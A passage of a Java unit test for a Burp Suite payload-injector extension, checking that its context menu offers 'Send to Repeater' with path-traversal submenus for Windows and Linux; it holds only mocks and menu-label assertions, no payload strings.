        stores.put("Path Traversal", ptStore);

        InjectionSettings settings = new InjectionSettings();
        com.littlespidy.payloadinjector.ui.PayloadContextMenuProvider provider =
                new com.littlespidy.payloadinjector.ui.PayloadContextMenuProvider(null, stores, null, settings);

        burp.api.montoya.http.message.requests.HttpRequest mockRequest = (burp.api.montoya.http.message.requests.HttpRequest) java.lang.reflect.Proxy.newProxyInstance(
                getClass().getClassLoader(),
                new Class<?>[]{burp.api.montoya.http.message.requests.HttpRequest.class},
                (proxy, method, args) -> {
                    if ("method".equals(method.getName())) return "GET";
                    if ("path".equals(method.getName())) return "/test";
                    if ("pathWithoutQuery".equals(method.getName())) return "/test";
                    return null;
                }
        );

        burp.api.montoya.ui.contextmenu.ContextMenuEvent mockEvent = (burp.api.montoya.ui.contextmenu.ContextMenuEvent) java.lang.reflect.Proxy.newProxyInstance(
                getClass().getClassLoader(),
                new Class<?>[]{burp.api.montoya.ui.contextmenu.ContextMenuEvent.class},
                (proxy, method, args) -> {
                    if ("selectedRequestResponses".equals(method.getName())) {
                        burp.api.montoya.http.message.HttpRequestResponse mockRr = (burp.api.montoya.http.message.HttpRequestResponse) java.lang.reflect.Proxy.newProxyInstance(
                                getClass().getClassLoader(),
                                new Class<?>[]{burp.api.montoya.http.message.HttpRequestResponse.class},
                                (p2, m2, a2) -> {
                                    if ("request".equals(m2.getName())) return mockRequest;
                                    return null;
                                }
                        );
                        return java.util.List.of(mockRr);
                    }
                    if ("messageEditorRequestResponse".equals(method.getName())) return java.util.Optional.empty();
                    return null;
                }
        );

        java.util.List<java.awt.Component> menuItems = provider.provideMenuItems(mockEvent);
        assertFalse(menuItems.isEmpty(), "Context menu items should not be empty");

        javax.swing.JMenu rootMenu = (javax.swing.JMenu) menuItems.get(0);
        assertEquals("Payload Injector (littlespidy)", rootMenu.getText());

        // Find "Send to Repeater with Armed Payloads"
        javax.swing.JMenu repeaterMenu = null;
        for (int i = 0; i < rootMenu.getItemCount(); i++) {
            javax.swing.JMenuItem item = rootMenu.getItem(i);
            if (item instanceof javax.swing.JMenu m && "Send to Repeater with Armed Payloads".equals(m.getText())) {
                repeaterMenu = m;
                break;
            }
        }
        assertNotNull(repeaterMenu, "Repeater menu must be present");

        // Find "Path Traversal Payloads" submenu
        javax.swing.JMenu ptSubmenu = null;
        for (int i = 0; i < repeaterMenu.getItemCount(); i++) {
            javax.swing.JMenuItem item = repeaterMenu.getItem(i);
            if (item instanceof javax.swing.JMenu m && "Path Traversal Payloads".equals(m.getText())) {
                ptSubmenu = m;
                break;
            }
        }
        assertNotNull(ptSubmenu, "Path Traversal Payloads submenu must be present");

        // Verify Windows and Linux submenus
        javax.swing.JMenu windowsSubmenu = null;
        javax.swing.JMenu linuxSubmenu = null;
        for (int i = 0; i < ptSubmenu.getItemCount(); i++) {
            javax.swing.JMenuItem item = ptSubmenu.getItem(i);
            if (item instanceof javax.swing.JMenu m) {
                if ("Windows".equals(m.getText())) windowsSubmenu = m;
                if ("Linux".equals(m.getText())) linuxSubmenu = m;
            }
        }

        assertNotNull(windowsSubmenu, "Windows submenu must exist under Path Traversal Payloads");
        assertNotNull(linuxSubmenu, "Linux submenu must exist under Path Traversal Payloads");

        assertEquals(1, windowsSubmenu.getItemCount(), "Windows submenu should contain 1 item");
        assertTrue(windowsSubmenu.getItem(0).getText().contains("Windows Traversal"));

        assertEquals(1, linuxSubmenu.getItemCount(), "Linux submenu should contain 1 item");
        assertTrue(linuxSubmenu.getItem(0).getText().contains("Linux Traversal"));
    }
}

